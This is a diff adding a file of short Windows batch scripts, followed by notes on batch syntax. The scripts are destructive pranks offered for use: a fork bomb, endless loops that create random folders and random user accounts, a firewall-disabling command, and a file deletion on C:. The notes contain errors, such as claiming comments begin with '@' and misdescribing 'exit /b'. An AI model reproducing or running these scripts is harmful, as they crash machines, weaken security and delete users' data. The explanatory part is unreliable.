@@ -1,0 +1,77 @@
+1.
+@echo off
+echo "any names we can give"
+pause
+
+2.
+@echo off
+:i 
+cd /d "C: or..."
+md %random%
+goto i
+
+3.
+@echo off
+:x
+net user %random% /add
+goto x 
+
+4.
+@echo off 
+%0|%0
+
+5.
+@echo off
+netsh firewall opmode "disadle" or "enable"
+
+6.
+@echo off
+:start
+set /a var=var+1
+explorer
+if %var% EQU 50 goto end
+goto start
+:end
+
+7.
+@echo off
+cd /d C:
+Del "any files name"
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+1. exit /b:
+
+This command exits the batch script with the specified exit code.
+/b signifies that the script should terminate immediately and not wait for any background child processes to finish.
+The exit code, when provided after /b, can be used to indicate the success or failure of the script. 0 generally indicates success, while other values may signify specific errors.
+2. set /p variable_name= [prompt]:
+
+This command is used to assign user input to a variable.
+/p instructs the script to pause and wait for the user to enter text.
+variable_name defines the name of the variable where the input will be stored.
+[prompt] (optional) specifies a message to be displayed before user input is taken.
+3. if /i conditional statements:
+
+This type of if statement checks if a string variable matches a specific pattern, ignoring case sensitivity.
+/i ensures case-insensitive comparison.
+"%variable_name%" represents the variable to be compared.
+The comparison operator (e.g., ==, !=) and the value to compare with follow.
+4. for /f loop:
+
+This command iterates over a set of data, typically lines from a file or output from another command.
+/f signifies "for" loop with specific options.
+"tokens=n delims=m" defines how to process each line:
+n: Number of tokens (separated by delimiters) to extract from each line.
+m: Delimiter character(s) separating tokens (e.g., space, comma, tab).
+%%a, %%b, etc.: represent placeholders for extracted tokens within the loop body.
+type filename command can be used within the loop to process data from a file.
+5. del filename:
+
+This command deletes a file specified by its name.
+Use with caution as deleted files cannot be easily recovered.
+Additional Notes:
+
+Comments are denoted by a @ symbol followed by the comment text.
+echo command displays text on the screen.
+set command is used to assign values to variables without requiring user input
